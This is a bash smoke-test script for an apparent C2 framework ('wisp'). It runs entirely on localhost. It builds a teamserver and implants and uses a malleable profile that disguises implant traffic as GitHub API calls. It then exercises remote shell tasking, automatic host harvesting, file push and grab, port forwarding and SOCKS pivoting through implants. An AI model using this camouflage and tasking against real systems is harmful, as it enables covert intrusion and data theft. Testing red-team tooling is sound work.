#!/usr/bin/env bash
# M1 smoke: two agents (malleable HTTP + raw TCP), token-authed API,
# SSE stream, PSK-ban path untouched here, restart persistence.
set -euo pipefail
cd "$(dirname "$0")/.."
TMP=$(mktemp -d)
SRV="" SRV2="" AG1="" AG2="" EV=""
cleanup() {
  set +m
  for p in "$EV" "$AG1" "$AG2" "$SRV2" "$SRV"; do [ -n "$p" ] && kill $p 2>/dev/null; done
  rm -rf "$TMP"
}
trap cleanup EXIT

pkill -9 -f wispd 2>/dev/null || true
RPORTS=$(python3 -c 'import socket
ss=[socket.socket() for _ in range(4)]
[x.bind(("127.0.0.1",0)) for x in ss]
print(" ".join(str(x.getsockname()[1]) for x in ss))
[x.close() for x in ss]')
HPORT=$(echo $RPORTS | cut -d' ' -f1); TPORT=$(echo $RPORTS | cut -d' ' -f2); APORT=$(echo $RPORTS | cut -d' ' -f3); RCPPORT=$(echo $RPORTS | cut -d' ' -f4)
API="http://127.0.0.1:$APORT"

echo "[demo] building..."
(cd server && go build -o "$TMP/wispd" ./cmd/wispd)
(cd agent/agent-go && go build -o "$TMP/wisp-agent" .)

# malleable profile shared by listener + agent1 (github-api camouflage)
cat >"$TMP/profile.json" <<'JSON'
{
  "name": "github-api",
  "uris": ["/app/installations/{n}/access_tokens", "/repos/{uuid}/events"],
  "method": "POST",
  "data": "header:X-GitHub-Request-Id",
  "ua_pool": ["octokit.js/1.0.0 Node.js/18", "curl/8.4.0"],
  "headers": [
    {"key": "Accept", "value": "application/vnd.github+json"},
    {"key": "X-GitHub-Api-Version", "value": "2022-11-28"}
  ],
  "response": {"status": 201, "content_type": "application/json",
    "body": "{\"id\":{n},\"url\":\"https://api.github.com/repos/{uuid}\",\"token\":\"{data}\",\"scopes\":[\"repo\"]}"}
}
JSON

start_server() {
  "$TMP/wispd" -api "127.0.0.1:$APORT" \
    -profile "$TMP/profile.json" -data "$TMP/data" -sleep 1000 -jitter 10 -autoharvest >>"$TMP/server.log" 2>&1 &
  local pid=$!
  for i in $(seq 1 40); do
    kill -0 $pid 2>/dev/null || { echo "[demo] FAIL: server died"; cat "$TMP/server.log"; exit 1; }
    [ -f "$TMP/data/api.token" ] && [ -f "$TMP/data/psk.key" ] && return 0
    sleep 0.3
  done
  echo "[demo] FAIL: server not up"; cat "$TMP/server.log"; exit 1
}
start_server; SRV=$!
PSK=$(cat "$TMP/data/psk.key"); TOKEN=$(cat "$TMP/data/api.token")


wait_api() { for i in $(seq 1 40); do curl -sf -H "X-Wisp-Token: $TOKEN" "$API/api/projects" >/dev/null && return 0; sleep 0.25; done; return 1; }
wait_api || { echo "[demo] FAIL: api not ready"; cat "$TMP/server.log"; exit 1; }

AUTH=(-H "X-Wisp-Token: $TOKEN")

# teamserver boots listener-less (RAT-WISP style): create the demo fleet via API
for spec in "demo-http|http|$HPORT|cli" "demo-tcp|tcp|$TPORT|" "demo-rcp|rcp|$RCPPORT|"; do
  IFS='|' read -r name kind port prof <<< "$spec"
  curl -sf "${AUTH[@]}" -X POST "$API/api/listeners" \
    -d "{\"name\":\"$name\",\"kind\":\"$kind\",\"addr\":\"127.0.0.1:$port\",\"profile\":\"$prof\",\"project\":\"default\"}" >/dev/null \
    || { echo "[demo] FAIL: create listener $name"; exit 1; }
done
echo "[demo] listeners created via API: http/$HPORT tcp/$TPORT rcp/$RCPPORT"

wait_port() { python3 -c "
import socket,sys,time
for _ in range(40):
    try:
        socket.create_connection(('127.0.0.1',int(sys.argv[1])),0.3).close(); sys.exit(0)
    except Exception: time.sleep(0.25)
sys.exit(1)" "$1"; }
wait_port $HPORT; wait_port $TPORT

sess_count() { curl -s "${AUTH[@]}" "$API/api/sessions" | python3 -c 'import sys,json;print(len(json.load(sys.stdin)))'; }

echo "[demo] SSE subscriber on /api/events"
curl -sN -H "X-Wisp-Token: $TOKEN" "$API/api/events" >"$TMP/events.log" 2>&1 & EV=$!

echo "[demo] agent1: HTTP via github-api profile"
python3 - "$PSK" $HPORT "$TMP/profile.json" "$TMP/agent1.json" <<'PY'
import json,sys
psk,port,prof,out = sys.argv[1:6]
cfg={"servers":[f"http://127.0.0.1:{port}"],"psk":psk,"sleep_ms":1000,"jitter_pct":10,
     "profile":json.load(open(prof))}
json.dump(cfg,open(out,"w"))
PY
"$TMP/wisp-agent" -config "$TMP/agent1.json" >"$TMP/agent1.log" 2>&1 & AG1=$!

echo "[demo] agent2: raw TCP transport"
cat >"$TMP/agent2.json" <<JSON
{ "servers": ["tcp://127.0.0.1:$TPORT"], "psk": "$PSK", "sleep_ms": 1000, "jitter_pct": 10 }
JSON
"$TMP/wisp-agent" -config "$TMP/agent2.json" >"$TMP/agent2.log" 2>&1 & AG2=$!

for i in $(seq 1 40); do [ "$(sess_count)" = "2" ] && break; sleep 0.5; done
SESSIONS=$(curl -s "${AUTH[@]}" "$API/api/sessions")
SESS_IDS=$(echo "$SESSIONS" | python3 -c 'import sys,json;print(" ".join(x["id"] for x in json.load(sys.stdin)))')
echo "$SESSIONS" | python3 -c '
import sys,json
for x in json.load(sys.stdin):
    print("[demo] session %s %s %s/%s" % (x["id"][:8], x["status"], x["info"]["os"], x["info"]["arch"]))'
[ "$(echo $SESSIONS | python3 -c 'import sys,json;print(len(json.load(sys.stdin)))')" = "2" ] \
  || { echo "[demo] FAIL: only got $(sess_count) sessions"; cat "$TMP/server.log" "$TMP/agent1.log" "$TMP/agent2.log"; exit 1; }

S1=$(echo "$SESSIONS" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')
S2=$(echo "$SESSIONS" | python3 -c 'import sys,json;print(json.load(sys.stdin)[1]["id"])')

wait_task() { # $1=session $2=wait-for-status
  local sid=$1
  for i in $(seq 1 30); do
    DONE=$(curl -s "${AUTH[@]}" "$API/api/tasks?session=$sid" | python3 -c '
import sys,json
for t in json.load(sys.stdin):
    if t["status"] in ("completed","failed"): print(t["status"]); break')
    [ -n "$DONE" ] && { echo "$DONE"; return; }
    sleep 0.5
  done; echo timeout; }

wait_out() {
  local sid=$1
  for i in $(seq 1 30); do
    OUT=$(curl -s "${AUTH[@]}" "$API/api/tasks?session=$sid" | python3 -c '
import sys,json
for t in json.load(sys.stdin):
    if t["task"]["cmd"]==1 and t["status"]=="completed" and t["result"]["output"]: print(t["result"]["output"]); break' || true)
    [ -n "$OUT" ] && { echo "$OUT"; return; }
    sleep 0.5
  done; echo ""; }

echo "[demo] shell task -> agent1 (via camouflaged header channel)"
curl -sf "${AUTH[@]}" -X POST "$API/api/sessions/$S1/tasks" \
  -d '{"cmd":"shell","args":{"command":"echo hello-malleable && whoami"}}' >/dev/null
O1=$(wait_out "$S1"); [ -n "$O1" ] || { echo "[demo] FAIL agent1"; cat "$TMP/agent1.log"; exit 1; }

echo "[demo] shell task -> agent2 (raw TCP)"
curl -sf "${AUTH[@]}" -X POST "$API/api/sessions/$S2/tasks" \
  -d '{"cmd":"shell","args":{"command":"echo hello-tcp"}}' >/dev/null
O2=$(wait_out "$S2"); [ -n "$O2" ] || { echo "[demo] FAIL agent2"; cat "$TMP/agent2.log"; exit 1; }

echo "[demo] agent1 result:"; echo "$O1" | sed 's/^/[demo]   | /'
echo "[demo] agent2 result:"; echo "$O2" | sed 's/^/[demo]   | /'

echo "[demo] auto-harvest check (3 tasks per session on first register)"
H1=$(curl -s "${AUTH[@]}" "$API/api/tasks?session=$S1" | python3 -c '
import sys,json; d=json.load(sys.stdin)
done=[t for t in d if t["status"]=="completed"]
print(1 if len(done)>=3 else 0)')
for i in $(seq 1 20); do [ "$H1" = "1" ] && break; sleep 0.5; H1=$(curl -s "${AUTH[@]}" "$API/api/tasks?session=$S1" | python3 -c '
import sys,json; d=json.load(sys.stdin)
done=[t for t in d if t["status"]=="completed"]
print(1 if len(done)>=3 else 0)')
done
[ "$H1" = "1" ] || { echo "[demo] FAIL: auto-harvest not completed"; exit 1; }
curl -s "${AUTH[@]}" "$API/api/tasks?session=$S1" | python3 -c '
import sys,json
for t in json.load(sys.stdin):
    if t["status"]=="completed": print("[demo]   | harvest cmd=%d ok exit=%d out[:40]=%s" % (t["task"]["cmd"], t["result"]["exit"], t["result"]["output"][:40].replace(chr(10)," ")))'

echo "[demo] structured ls -> /tmp"
curl -sf "${AUTH[@]}" -X POST "$API/api/sessions/$S1/tasks" -d '{"cmd":"ls","args":{"path":"/tmp"}}' >/dev/null
for i in $(seq 1 30); do
  LSOK=$(curl -s "${AUTH[@]}" "$API/api/tasks?session=$S1" | python3 -c '
import sys,json
for t in json.load(sys.stdin):
    if t["task"]["cmd"]==12 and t["status"]=="completed":
        d=json.loads(t["result"]["output"]); print(len(d["entries"]))
        break' || true)
  [ -n "$LSOK" ] && break
  sleep 0.5
done
[ -n "$LSOK" ] || { echo "[demo] FAIL: ls not completed"; exit 1; }
echo "[demo]   | /tmp entries: $LSOK ✅"

echo "[demo] Type3 file roundtrip (5MB push down + grab up)"
dd if=/dev/urandom of="$TMP/src.bin" bs=1m count=5 2>/dev/null
SRC=$(shasum -a 256 "$TMP/src.bin" | cut -d' ' -f1)
INBOX=$(curl -s -X POST "${AUTH[@]}" --data-binary "@$TMP/src.bin" "$API/api/files/upload" | python3 -c 'import sys,json;print(json.load(sys.stdin)["inbox"])')
echo "[demo] on-demand Type2: request dial over Type1 (CmdRCPConnect)"
for sid in $SESS_IDS; do curl -s -X POST "${AUTH[@]}" "$API/api/rcp/$sid/connect" >/dev/null; done
RCPON=""
for i in $(seq 1 30); do
  for sid in $SESS_IDS; do
    [ "$(curl -s "${AUTH[@]}" "$API/api/rcp/$sid/status" | python3 -c 'import sys,json;print(int(json.load(sys.stdin)["online"]))')" = "1" ] && RCPON=$sid && break
  done
  [ -n "$RCPON" ] && break
  sleep 1
done
[ -n "$RCPON" ] || { echo "[demo] FAIL: no RCP channel (on-demand dial)"; exit 1; }
echo "[demo]   | Type2 dial-by-command up for $RCPON ✅"
DJ=$(curl -s -X POST "${AUTH[@]}" -H 'Content-Type: application/json' -d '{"mode":"down","remote":"'$TMP'/pushed.bin","inbox":"'$INBOX'"}' "$API/api/sessions/$RCPON/files" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
wait_job() { for i in $(seq 1 60); do st=$(curl -s "${AUTH[@]}" "$API/api/files" | python3 -c "import sys,json;j=[x for x in json.load(sys.stdin) if x['id']=='$1'];print(j[0]['status'] if j else '-')"); [ "$st" = done -o "$st" = failed ] && { echo $st; return; }; sleep 0.5; done; echo timeout; }
ST=$(wait_job $DJ); DST=$(shasum -a 256 "$TMP/pushed.bin" 2>/dev/null | cut -d' ' -f1)
[ "$ST" = done ] && [ "$SRC" = "$DST" ] || { echo "[demo] FAIL: push $ST"; exit 1; }
echo "[demo]   | push(down) ✅ 5MB"
UJ=$(curl -s -X POST "${AUTH[@]}" -H 'Content-Type: application/json' -d '{"mode":"up","remote":"'$TMP'/pushed.bin"}' "$API/api/sessions/$RCPON/files" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
ST=$(wait_job $UJ); curl -s -o "$TMP/back.bin" "${AUTH[@]}" "$API/api/files/$UJ/download"
BACK=$(shasum -a 256 "$TMP/back.bin" | cut -d' ' -f1)
[ "$ST" = done ] && [ "$SRC" = "$BACK" ] || { echo "[demo] FAIL: grab $ST"; exit 1; }
echo "[demo]   | grab(up)+download ✅ 双向字节一致"

echo "[demo] KCP listener + port-forward (M3.5)"
KCPPORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
curl -sf "${AUTH[@]}" -X POST "$API/api/listeners" -d "{\"name\":\"demo-kcp\",\"kind\":\"kcp\",\"addr\":\"127.0.0.1:$KCPPORT\",\"project\":\"default\"}" >/dev/null
python3 -c "
import json
json.dump({'servers':['kcp://127.0.0.1:$KCPPORT'],'psk':'$PSK','sleep_ms':1000}, open('$TMP/agent3.json','w'))"
"$TMP/wisp-agent" -config "$TMP/agent3.json" >"$TMP/agent3.log" 2>&1 & AG3=$!
trap "kill $AG1 $AG2 $AG3 2>/dev/null || true; rm -rf $TMP" EXIT
for i in $(seq 1 20); do [ "$(sess_count)" = "3" ] && break; sleep 0.5; done
[ "$(sess_count)" = "3" ] || { echo "[demo] FAIL: kcp agent not online"; exit 1; }
echo "[demo]   | KCP 回连 ✅"
LID=$(curl -s "${AUTH[@]}" "$API/api/listeners" | python3 -c 'import sys,json;print([l["id"] for l in json.load(sys.stdin) if l["name"]=="demo-kcp"][0])')
KID=$(curl -s "${AUTH[@]}" "$API/api/sessions" | python3 -c "
import sys,json
print([s['id'] for s in json.load(sys.stdin) if s.get('listener')=='$LID'][0])")
curl -s -X POST "${AUTH[@]}" "$API/api/rcp/$KID/connect" >/dev/null
for i in $(seq 1 15); do [ "$(curl -s "${AUTH[@]}" "$API/api/rcp/$KID/status" | python3 -c 'import sys,json;print(int(json.load(sys.stdin)["online"]))')" = "1" ] && break; sleep 1; done
FR=$(curl -s -X POST "${AUTH[@]}" -d '{"session":"'$KID'","listen":"127.0.0.1:0","target":"127.0.0.1:'$APORT'"}' "$API/api/forwards")
BOUND=$(echo "$FR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("listen",""))')
CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 8 "http://$BOUND/api/projects")
[ "$CODE" = "401" ] && echo "[demo]   | 端口转发桥接 ✅（经 implant 回到 teamserver，无 token 得 401）" || { echo "[demo] FAIL: forward got $CODE"; exit 1; }

SR=$(curl -s -X POST "${AUTH[@]}" -d '{"session":"'$KID'","listen":"127.0.0.1:0"}' "$API/api/socks")
SPORT=$(echo "$SR" | cut -d'"' -f8)
SCODE=$(curl -s -o /dev/null --max-time 10 --socks5-hostname "127.0.0.1:$SPORT" -w '%{http_code}' "http://127.0.0.1:$APORT/")
SID=$(echo "$SR" | cut -d'"' -f4)
curl -s -X DELETE "${AUTH[@]}" "$API/api/socks/$SID" >/dev/null
[ "$SCODE" = "401" ] && echo "[demo]   | SOCKS5 动态代理 ✅（CONNECT 握手 + 隧道回连 teamserver 得 401）" || { echo "[demo] FAIL: socks got $SCODE ($SR)"; exit 1; }
kill $AG3 2>/dev/null

echo "[demo] token check: no-token request must be 401"
CODE=$(curl -s -o /dev/null -w '%{http_code}' "$API/api/sessions")
[ "$CODE" = "401" ] || { echo "[demo] FAIL: unauth got $CODE"; exit 1; }

echo "[demo] SSE events observed:"
grep -c '^data:' "$TMP/events.log" >/dev/null && \
  grep '^data:' "$TMP/events.log" | head -3 | sed 's/^/[demo]   | /' || { echo "[demo] FAIL: no SSE"; exit 1; }

echo "[demo] restart teamserver (persistence check)"
kill $SRV; wait $SRV 2>/dev/null || true
kill $AG1 $AG2; AG1=""; AG2=""   # agents stop on server death here (single-attempt loop dies)
start_server; SRV=$!
wait_api || { echo "[demo] FAIL: api not ready after restart"; cat "$TMP/server.log"; exit 1; }
HIST=$(curl -s "${AUTH[@]}" "$API/api/history?project=default" | python3 -c 'import sys,json;print(len(json.load(sys.stdin)))')
[ "$HIST" = "3" ] || { echo "[demo] FAIL: history=$HIST"; cat "$TMP/server.log"; exit 1; }
echo "[demo] history after restart: $HIST persisted sessions ✅"

echo "[demo] PASS ✅ (malleable HTTP + TCP + token + SSE + persistence)"
